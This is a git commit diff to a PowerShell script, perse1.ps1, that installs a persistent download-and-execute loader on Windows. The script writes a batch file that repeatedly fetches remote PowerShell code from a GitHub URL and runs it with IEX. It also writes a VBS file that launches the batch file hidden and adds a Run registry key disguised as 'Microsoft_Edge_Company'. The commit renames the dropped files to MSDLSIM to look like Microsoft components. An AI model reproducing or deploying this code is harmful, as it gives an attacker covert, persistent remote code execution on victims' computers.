e396f69fda828e276fd0ba71388e25997068787d
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-25 09:38:28 -0500

    Update perse1.ps1

--- perse1.ps1
+++ perse1.ps1
@@ -3,9 +3,9 @@ md C:\Intel\Profiles/IE/IEX; $contentToAdd = @"
 powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
 timeout /t 30
 goto a
-"@; add-content "C:\Intel\Profiles/IE/IEX/perse.bat" $contenttoadd; $contentToAdd = @"
+"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.bat" $contenttoadd; $contentToAdd = @"
 WScript.Sleep 10000
 set objshell = createobject("wscript.shell")
-objshell.run "C:\Intel\Profiles/IE/IEX\perse.bat",vbhide
-"@; add-content "C:\Intel\Profiles/IE/IEX/perse.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/perse.vbs; cd C:\Intel\Profiles/IE/IEX; ./perse.vbs
+objshell.run "C:\Intel\Profiles/IE/IEX\MSDLSIM.bat",vbhide
+"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs; cd C:\Intel\Profiles/IE/IEX; ./MSDLSIM.vbs
 exit
